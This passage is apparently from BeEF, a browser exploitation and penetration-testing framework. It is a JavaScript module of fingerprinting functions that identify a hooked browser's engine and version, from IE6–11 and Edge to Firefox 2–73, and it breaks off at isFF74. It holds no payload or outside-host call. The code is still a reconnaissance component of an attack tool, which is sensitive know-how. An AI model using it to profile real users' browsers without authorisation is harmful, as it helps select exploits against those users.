//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/**
 * Basic browser functions.
 * @namespace beef.browser
 */
beef.browser = {

    /**
     * Returns the protocol.
     * @example: beef.browser.getProtocol()
     */
    getProtocol: function() {
        return document.location.protocol;
    },

    /**
     * Returns the user agent that the browser is claiming to be.
     * @example: beef.browser.getBrowserReportedName()
     */
    getBrowserReportedName: function () {
        return navigator.userAgent;
    },

    /**
     * Returns the underlying layout engine in use by the browser.
     * @example: beef.browser.getBrowserEngine()
     */
    getBrowserEngine: function() {
      try {
        var engine = platform.layout;
        if (!!engine)
          return engine;
      } catch (e) {}
      return 'unknown';
    },

    /**
     * Returns true if Avant Browser.
     * @example: beef.browser.isA()
     */
    isA: function () {
        return window.navigator.userAgent.match(/Avant TriCore/) != null;
    },

    /**
     * Returns true if Iceweasel.
     * @example: beef.browser.isIceweasel()
     */
    isIceweasel: function () {
        return window.navigator.userAgent.match(/Iceweasel\/\d+\.\d/) != null;
    },

    /**
     * Returns true if Midori.
     * @example: beef.browser.isMidori()
     */
    isMidori: function () {
        return window.navigator.userAgent.match(/Midori\/\d+\.\d/) != null;
    },

    /**
     * Returns true if Odyssey
     * @example: beef.browser.isOdyssey()
     */
    isOdyssey: function () {
        return (window.navigator.userAgent.match(/Odyssey Web Browser/) != null && window.navigator.userAgent.match(/OWB\/\d+\.\d/) != null);
    },

    /**
     * Returns true if Brave
     * @example: beef.browser.isBrave()
     */
    isBrave: function(){
        return (window.navigator.userAgent.match(/brave\/\d+\.\d/) != null && window.navigator.userAgent.match(/Brave\/\d+\.\d/) != null);
    },

    /**
     * Returns true if IE6.
     * @example: beef.browser.isIE6()
     */
    isIE6: function () {
        return !window.XMLHttpRequest && !window.globalStorage;
    },

    /**
     * Returns true if IE7.
     * @example: beef.browser.isIE7()
     */
    isIE7: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !window.getComputedStyle && !window.globalStorage && !document.documentMode;
    },

    /**
     * Returns true if IE8.
     * @example: beef.browser.isIE8()
     */
    isIE8: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !window.performance;
    },

    /**
     * Returns true if IE9.
     * @example: beef.browser.isIE9()
     */
    isIE9: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints === "undefined";
    },

    /**
     *
     * Returns true if IE10.
     * @example: beef.browser.isIE10()
     */
    isIE10: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints !== "undefined";
    },

    /**
     *
     * Returns true if IE11.
     * @example: beef.browser.isIE11()
     */
    isIE11: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.performance && typeof navigator.msMaxTouchPoints !== "undefined" && typeof document.selection === "undefined" && typeof document.createStyleSheet === "undefined" && typeof window.createPopup === "undefined" && typeof window.XDomainRequest === "undefined";
    },

    /**
     *
     * Returns true if Edge.
     * @example: beef.browser.isEdge()
     */
    isEdge: function () {
        return !beef.browser.isIE() && !!window.styleMedia && (/Edg\/\d+\.\d/.test(window.navigator.userAgent) || /Edge\/\d+\.\d/.test(window.navigator.userAgent));
    },

    /**
     * Returns true if IE.
     * @example: beef.browser.isIE()
     */
    isIE: function () {
        return this.isIE6() || this.isIE7() || this.isIE8() || this.isIE9() || this.isIE10() || this.isIE11();
    },

    /**
     * Returns true if FF2.
     * @example: beef.browser.isFF2()
     */
    isFF2: function () {
        return !!window.globalStorage && !window.postMessage;
    },

    /**
     * Returns true if FF3.
     * @example: beef.browser.isFF3()
     */
    isFF3: function () {
        return !!window.globalStorage && !!window.postMessage && !JSON.parse;
    },

    /**
     * Returns true if FF3.5.
     * @example: beef.browser.isFF3_5()
     */
    isFF3_5: function () {
        return !!window.globalStorage && !!JSON.parse && !window.FileReader;
    },

    /**
     * Returns true if FF3.6.
     * @example: beef.browser.isFF3_6()
     */
    isFF3_6: function () {
        return !!window.globalStorage && !!window.FileReader && !window.multitouchData && !window.history.replaceState;
    },

    /**
     * Returns true if FF4.
     * @example: beef.browser.isFF4()
     */
    isFF4: function () {
        return !!window.globalStorage && !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/4\./) != null;
    },

    /**
     * Returns true if FF5.
     * @example: beef.browser.isFF5()
     */
    isFF5: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/5\./) != null;
    },

    /**
     * Returns true if FF6.
     * @example: beef.browser.isFF6()
     */
    isFF6: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/6\./) != null;
    },

    /**
     * Returns true if FF7.
     * @example: beef.browser.isFF7()
     */
    isFF7: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/7\./) != null;
    },

    /**
     * Returns true if FF8.
     * @example: beef.browser.isFF8()
     */
    isFF8: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/8\./) != null;
    },

    /**
     * Returns true if FF9.
     * @example: beef.browser.isFF9()
     */
    isFF9: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/9\./) != null;
    },

    /**
     * Returns true if FF10.
     * @example: beef.browser.isFF10()
     */
    isFF10: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/10\./) != null;
    },

    /**
     * Returns true if FF11.
     * @example: beef.browser.isFF11()
     */
    isFF11: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/11\./) != null;
    },

    /**
     * Returns true if FF12
     * @example: beef.browser.isFF12()
     */
    isFF12: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/12\./) != null;
    },

    /**
     * Returns true if FF13
     * @example: beef.browser.isFF13()
     */
    isFF13: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/13\./) != null;
    },

    /**
     * Returns true if FF14
     * @example: beef.browser.isFF14()
     */
    isFF14: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/14\./) != null;
    },

    /**
     * Returns true if FF15
     * @example: beef.browser.isFF15()
     */
    isFF15: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/15\./) != null;
    },

    /**
     * Returns true if FF16
     * @example: beef.browser.isFF16()
     */
    isFF16: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/16\./) != null;
    },

    /**
     * Returns true if FF17
     * @example: beef.browser.isFF17()
     */
    isFF17: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/17\./) != null;
    },

    /**
     * Returns true if FF18
     * @example: beef.browser.isFF18()
     */
    isFF18: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/18\./) != null;
    },

    /**
     * Returns true if FF19
     * @example: beef.browser.isFF19()
     */
    isFF19: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && window.navigator.userAgent.match(/Firefox\/19\./) != null;
    },

    /**
     * Returns true if FF20
     * @example: beef.browser.isFF20()
     */
    isFF20: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && window.navigator.userAgent.match(/Firefox\/20\./) != null;
    },

    /**
     * Returns true if FF21
     * @example: beef.browser.isFF21()
     */
    isFF21: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/21\./) != null;
    },

    /**
     * Returns true if FF22
     * @example: beef.browser.isFF22()
     */
    isFF22: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/22\./) != null;
    },

    /**
     * Returns true if FF23
     * @example: beef.browser.isFF23()
     */
    isFF23: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/23\./) != null;
    },

    /**
     * Returns true if FF24
     * @example: beef.browser.isFF24()
     */
    isFF24: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/24\./) != null;
    },

    /**
     * Returns true if FF25
     * @example: beef.browser.isFF25()
     */
    isFF25: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/25\./) != null;
    },

    /**
     * Returns true if FF26
     * @example: beef.browser.isFF26()
     */
    isFF26: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/26./) != null;
    },

    /**
     * Returns true if FF27
     * @example: beef.browser.isFF27()
     */
    isFF27: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && window.navigator.userAgent.match(/Firefox\/27./) != null;
    },

    /**
     * Returns true if FF28
     * @example: beef.browser.isFF28()
     */
    isFF28: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt !== 'function' && window.navigator.userAgent.match(/Firefox\/28./) != null;
    },

    /**
     * Returns true if FF29
     * @example: beef.browser.isFF29()
     */
    isFF29: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && window.navigator.userAgent.match(/Firefox\/29./) != null;
    },

    /**
     * Returns true if FF30
     * @example: beef.browser.isFF30()
     */
    isFF30: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && window.navigator.userAgent.match(/Firefox\/30./) != null;
    },

    /**
     * Returns true if FF31
     * @example: beef.browser.isFF31()
     */
    isFF31: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && window.navigator.userAgent.match(/Firefox\/31./) != null;
    },

    /**
     * Returns true if FF32
     * @example: beef.browser.isFF32()
     */
    isFF32: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/32./) != null;
    },

    /**
     * Returns true if FF33
     * @example: beef.browser.isFF33()
     */
    isFF33: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/33./) != null;
    },

    /**
     * Returns true if FF34
     * @example: beef.browser.isFF34()
     */
    isFF34: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/34./) != null;
    },

    /**
     * Returns true if FF35
     * @example: beef.browser.isFF35()
     */
    isFF35: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/35./) != null;
    },

    /**
     * Returns true if FF36
     * @example: beef.browser.isFF36()
     */
    isFF36: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/36./) != null;
    },

    /**
     * Returns true if FF37
     * @example: beef.browser.isFF37()
     */
    isFF37: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/37./) != null;
    },

    /**
     * Returns true if FF38
     * @example: beef.browser.isFF38()
     */
    isFF38: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/38./) != null;
    },

    /**
     * Returns true if FF39
     * @example: beef.browser.isFF39()
     */
    isFF39: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/39./) != null;
    },

    /**
     * Returns true if FF40
     * @example: beef.browser.isFF40()
     */
    isFF40: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/40./) != null;
    },

    /**
     * Returns true if FF41
     * @example: beef.browser.isFF41()
     */
    isFF41: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/41./) != null;
    },

    /**
     * Returns true if FF42
     * @example: beef.browser.isFF42()
     */
    isFF42: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/42./) != null;
    },

    /**
     * Returns true if FF43
     * @example: beef.browser.isFF43()
     */
    isFF43: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/43./) != null;
    },

    /**
     * Returns true if FF44
     * @example: beef.browser.isFF44()
     */
    isFF44: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/44./) != null;
    },

    /**
     * Returns true if FF45
     * @example: beef.browser.isFF45()
     */
    isFF45: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/45./) != null;
    },

    /**
     * Returns true if FF46
     * @example: beef.browser.isFF46()
     */
    isFF46: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/46./) != null;
    },

    /**
     * Returns true if FF47
     * @example: beef.browser.isFF47()
     */
    isFF47: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/47./) != null;
    },

    /**
     * Returns true if FF48
     * @example: beef.browser.isFF48()
     */
    isFF48: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/48./) != null;
    },

    /**
     * Returns true if FF49
     * @example: beef.browser.isFF49()
     */
    isFF49: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/49./) != null;
    },

    /**
     * Returns true if FF50
     * @example: beef.browser.isFF50()
     */
    isFF50: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/50./) != null;
    },

    /**
     * Returns true if FF51
     * @example: beef.browser.isFF51()
     */
    isFF51: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/51./) != null;
    },

    /**
     * Returns true if FF52
     * @example: beef.browser.isFF52()
     */
    isFF52: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/52./) != null;
    },

    /**
     * Returns true if FF53
     * @example: beef.browser.isFF53()
     */
    isFF53: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/53./) != null;
    },

    /**
     * Returns true if FF54
     * @example: beef.browser.isFF54()
     */
    isFF54: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/54./) != null;
    },

    /**
     * Returns true if FF55
     * @example: beef.browser.isFF55()
     */
    isFF55: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/55./) != null;
    },

    /**
     * Returns true if FF56
     * @example: beef.browser.isFF56()
     */
    isFF56: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/56./) != null;
    },

    /**
     * Returns true if FF57
     * @example: beef.browser.isFF57()
     */
    isFF57: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/57./) != null;
    },
    
    /**
     * Returns true if FF58
     * @example: beef.browser.isFF58()
     */
    isFF58: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/58./) != null;
    },

    /**
     * Returns true if FF59
     * @example: beef.browser.isFF59()
     */
    isFF59: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/59./) != null;
    },

    /**
     * Returns true if FF60
     * @example: beef.browser.isFF60()
     */
    isFF60: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/60./) != null;
    },

    /**
     * Returns true if FF61
     * @example: beef.browser.isFF61()
     */
    isFF61: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/61./) != null;
    },

    /**
     * Returns true if FF62
     * @example: beef.browser.isFF62()
     */
    isFF62: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/62./) != null;
    },

    /**
     * Returns true if FF63
     * @example: beef.browser.isFF63()
     */
    isFF63: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/63./) != null;
    },

    /**
     * Returns true if FF64
     * @example: beef.browser.isFF64()
     */
    isFF64: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/64./) != null;
    },

    /**
     * Returns true if FF65
     * @example: beef.browser.isFF65()
     */
    isFF65: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/65./) != null;
    },

    /**
     * Returns true if FF66
     * @example: beef.browser.isFF66()
     */
    isFF66: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/66./) != null;
    },

    /**
     * Returns true if FF67
     * @example: beef.browser.isFF67()
     */
    isFF67: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/67./) != null;
    },

    /**
     * Returns true if FF68
     * @example: beef.browser.isFF68()
     */
    isFF68: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/68./) != null;
    },

    /**
     * Returns true if FF69
     * @example: beef.browser.isFF69()
     */
    isFF69: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/69./) != null;
    },

    /**
     * Returns true if FF70
     * @example: beef.browser.isFF70()
     */
    isFF70: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/70./) != null;
    },

    /**
     * Returns true if FF71
     * @example: beef.browser.isFF71()
     */
    isFF71: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/71./) != null;
    },

    /**
     * Returns true if FF72
     * @example: beef.browser.isFF72()
     */
    isFF72: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/72./) != null;
    },

    /**
     * Returns true if FF73
     * @example: beef.browser.isFF73()
     */
    isFF73: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/73./) != null;
    },

    /**
     * Returns true if FF74
     * @example: beef.browser.isFF74()
     */
    isFF74: function () {
